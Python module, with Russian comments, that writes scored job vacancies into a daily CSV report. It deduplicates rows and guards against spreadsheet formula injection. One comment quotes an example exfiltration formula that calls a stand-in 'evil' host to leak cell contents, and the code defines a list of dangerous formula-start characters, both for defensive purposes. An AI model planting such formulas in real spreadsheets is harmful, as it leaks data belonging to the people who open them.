import csv
from collections.abc import Sequence
from datetime import datetime
from pathlib import Path

from hh_search.domain.models import ScoredVacancy
from hh_search.sinks.base import REPORT_DATE_FORMAT

# `listing`, а не `found_by_query`: после переезда discovery на листинги в
# этом поле лежит slug (`programmist`), а не текст поискового запроса.
COLUMNS = [
    "id",
    "score",
    "cluster",
    "title",
    "company",
    "area",
    "salary_from",
    "salary_to",
    "currency",
    "published_at",
    "listing",
    "url",
]

# Excel и LibreOffice исполняют содержимое ячейки, начинающееся с этих
# символов. Заголовок и название компании пишет работодатель, то есть это
# внешний недоверенный текст: `=HYPERLINK("http://evil/?u="&A1;"вакансия")`
# в заголовке превращает отчёт в утечку. Квотирование модуля csv от формул
# не защищает — оно про разделители, а не про интерпретацию.
_FORMULA_STARTS = ("=", "+", "-", "@", "\t", "\r")


def _cell(value: object) -> str:
    """Значение ячейки: строка, обезвреженная от интерпретации формулой.

    Апостроф перед значением — то, что понимают и Excel, и LibreOffice:
    ячейка остаётся текстом. Числовые колонки этого не боятся (они
    формируются нами и неотрицательны), но правило применяется ко всем,
    чтобы не пришлось помнить, какая колонка внешняя.
    """
    text = "" if value is None else str(value)
    return f"'{text}" if text.startswith(_FORMULA_STARTS) else text


class CsvSink:
    """Полная выгрузка нового: в CSV идёт всё, порога здесь нет (спека §6.3).

    Формат подчинён единственному потребителю — таблице на рабочем столе:
    UTF-8 с BOM и разделитель `;`, иначе русский текст в Excel читается как
    `ÐžÐžÐž`, а с русской локалью вся строка ложится в одну колонку.
    """

    name = "csv"

    def __init__(self, reports_dir: Path) -> None:
        self._reports_dir = reports_dir

    def emit(self, vacancies: Sequence[ScoredVacancy], now: datetime) -> None:
        if not vacancies:
            return
        self._reports_dir.mkdir(parents=True, exist_ok=True)
        path = self._reports_dir / f"{now:%Y-%m-%d}-new.csv"
        first_write = not path.exists()
        written = self._written_ids(path)
        fresh: list[ScoredVacancy] = []
        for item in vacancies:
            if item.discovered.id in written:
                continue
            # Пополняем на ходу: дубль может прийти и внутри одной пачки.
            written.add(item.discovered.id)
            fresh.append(item)
        if not fresh:
            return
        # BOM обязан быть ровно один: кодек utf-8-sig пишет его при каждом
        # открытии файла, поэтому второй прогон того же дня вставил бы
        # ещё один U+FEFF посреди данных.
        encoding = "utf-8-sig" if first_write else "utf-8"
        with path.open("a", newline="", encoding=encoding) as handle:
            writer = csv.DictWriter(handle, fieldnames=COLUMNS, delimiter=";")
            if first_write:
                writer.writeheader()
            for item in fresh:
                writer.writerow(self._row(item))

    def _written_ids(self, path: Path) -> set[str]:
        """id, уже лежащие в файле текущего дня.

        Доставка в приёмник — at-least-once по построению: `mark_reported()`
        вызывается ПОСЛЕ всех приёмников, иначе упавший приёмник терял бы
        вакансию навсегда. Значит, повтор возможен всегда — при частичном
        отказе приёмников и при аварии между `emit` и `mark_reported`, — и
        снять его может только сам приёмник. Источник истины — файл, а не
        поле объекта: между прогонами процесс перезапускается.
        """
        if not path.exists():
            return set()
        with path.open(encoding="utf-8-sig", newline="") as handle:
            return {row["id"] for row in csv.DictReader(handle, delimiter=";") if row.get("id")}

    def _row(self, item: ScoredVacancy) -> dict[str, str]:
        discovered = item.discovered
        salary = discovered.salary
        published_at = discovered.published_at
        return {
            "id": _cell(discovered.id),
            "score": _cell(item.score.total),
            "cluster": _cell(item.cluster),
            "title": _cell(discovered.title),
            "company": _cell(discovered.company),
            "area": _cell(discovered.area),
            "salary_from": _cell(salary.amount_from),
            "salary_to": _cell(salary.amount_to),
            "currency": _cell(salary.currency),
            # Пустая ячейка, а не «None»: дата публикации неизвестна, пока
            # вакансия не обогащена, и выдумывать её нечем (спека §5.3).
            "published_at": _cell(
                None if published_at is None else format(published_at, REPORT_DATE_FORMAT)
            ),
            "listing": _cell(discovered.found_by_query),
            "url": _cell(discovered.url),
        }
